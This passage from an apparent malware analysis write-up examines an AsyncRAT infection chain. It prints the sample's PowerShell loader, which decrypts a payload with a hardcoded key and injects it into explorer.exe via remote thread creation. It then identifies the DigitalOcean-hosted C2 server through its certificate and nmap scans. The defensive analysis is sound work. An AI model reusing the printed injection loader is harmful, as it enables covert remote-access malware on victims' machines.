    [Encryption]::DecryptFile($inputFilePath, $key)
}



$mutexName = "mutex_kernel-QuCpR2hLg4"
$mutexAccess = 0x1F0001
$manifestFile = Join-Path -Path $PSScriptRoot -ChildPath "kernel.manifest"
$kernelmanifest = "ln9wN7u3nDZC9NZAtxV8oSPqqmswXu2GYW4Zhf9AGY8="


try {
    $mutex = [Win32.Kernel32]::OpenMutex($mutexAccess, $false, $mutexName)
    if ($mutex -ne [IntPtr]::Zero) {
        Write-Host ":)"
        [Win32.Kernel32]::CloseHandle($mutex) | Out-Null
    }
    else {
        $finally = DecryptFile -inputFilePath $manifestFile -key $kernelmanifest
        $processName = "explorer"
        $processes = Get-Process -Name $processName
        $processId = $processes[0].Id
        $processHandle = [WinAPI]::OpenProcess([WinAPI]::PROCESS_ALL_ACCESS, $false, [UInt32]$processId)
        
        if ($processHandle -eq [IntPtr]::Zero) {
        }
        
        $remoteMem = [WinAPI]::VirtualAllocEx($processHandle, [IntPtr]::Zero, [UInt32]$finally.Length, [WinAPI]::MEM_COMMIT, [WinAPI]::PAGE_EXECUTE_READWRITE)
        
        if ($remoteMem -eq [IntPtr]::Zero) {
            Write-Error "   ."
            [WinAPI]::CloseHandle($processHandle)
        }
        
        $bytesWritten = [IntPtr]::Zero
        $success = [WinAPI]::WriteProcessMemory($processHandle, $remoteMem, $finally, [UInt32]$finally.Length, [ref]$bytesWritten)
        
        if (-not $success -or $bytesWritten -ne [IntPtr]$finally.Length) {
            Write-Error "He     ."
            [WinAPI]::CloseHandle($processHandle)
        }
        
        $threadHandle = [IntPtr]::Zero
        $threadId = [IntPtr]::Zero
        $threadHandle = [WinAPI]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $remoteMem, [IntPtr]::Zero, 0, [ref]$threadId)
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            Write-Error "He   ."
            [WinAPI]::CloseHandle($processHandle)
        }
        
        [WinAPI]::CloseHandle($threadHandle)
        [WinAPI]::CloseHandle($processHandle)
    }
}

catch {
    Write-Host "Error: $($_)"
}
```
This script also attempts to inject into explorer.exe, however because of the previous success and the mutex, this script will close. After, the script launches `threads.ps1` which is identical to `boot.ps1` and `kernel.ps1`.


Finally, `explorer.exe` is injected in via the `taskhostw.exe` process calling `C:\Users\admin\AppData\Local\Programs\Common\NUL\boot.ps1`.

`explorer.exe` starts communicating with `164.92.232.138` which appears to be the C2 server. Running a WHOIS on this IP reveals its in the DigitalOceans IP space, indicating the attacker is paying for a VPS to host their C2 on DigitalOcean

ANY.RUN detects a known signature for AsyncRAT, a [FOSS](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp) remote access tool developed in C-Sharp.
![ASyncRat Detection]({{ site.baseurl }}/assets/images/MalAl-IBC/asyncrat-detect.png)


We can further confirm this via the response from the C2 server, although we don't have TLS MITM on ANY.RUN, we still see ASYNCRAT in plaintext as this comes from the certificate name.
![ASyncRat Cert in packet analysis]({{ site.baseurl }}/assets/images/MalAl-IBC/asyncrat-cert.png)

We confirm this via wireshark.
![ASyncRat Cert wireshark]({{ site.baseurl }}/assets/images/MalAl-IBC/asyncrat-cert-wireshark.png)


We can further confirm this with a nmap scan
```
└─$ sudo nmap -A 164.92.232.138 -p 4723 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 05:20 MST
Nmap scan report for 164.92.232.138
Host is up (0.16s latency).

PORT     STATE SERVICE     VERSION
4723/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=AsyncRAT Server
| Not valid before: 2024-08-27T21:36:10
|_Not valid after:  9999-12-31T23:59:59
|_ssl-date: 2024-08-30T12:21:37+00:00; -1s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 6.X (86%)
OS CPE: cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: FreeBSD 6.2-RELEASE (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 18 hops

Host script results:
|_clock-skew: -1s

└─$ sudo nmap -A 164.92.232.138 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 05:18 MST
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 05:21 (0:01:18 remaining)
Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 05:20 (0:00:00 remaining)
Nmap scan report for 164.92.232.138
Host is up (0.039s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
53/tcp   open  domain             Cloudflare public DNS
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WIN-5LRC2JGAPN2
|   NetBIOS_Domain_Name: WIN-5LRC2JGAPN2
|   NetBIOS_Computer_Name: WIN-5LRC2JGAPN2
|   DNS_Domain_Name: WIN-5LRC2JGAPN2
|   DNS_Computer_Name: WIN-5LRC2JGAPN2
|   Product_Version: 10.0.26100
|_  System_Time: 2024-08-30T12:20:14+00:00
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WIN-5LRC2JGAPN2
| Not valid before: 2024-08-28T21:27:18
|_Not valid after:  2025-02-27T21:27:18
```


NOTE: The VPS running the C2 for ASyncRat was reported to DigitalOcean. The github repo(Any many like it) were reported to GitHub. While signatures for this specific samples were already uploaded to VirusTotal, Windows Defender failed to detect anything prior to being disabled by the malware. 

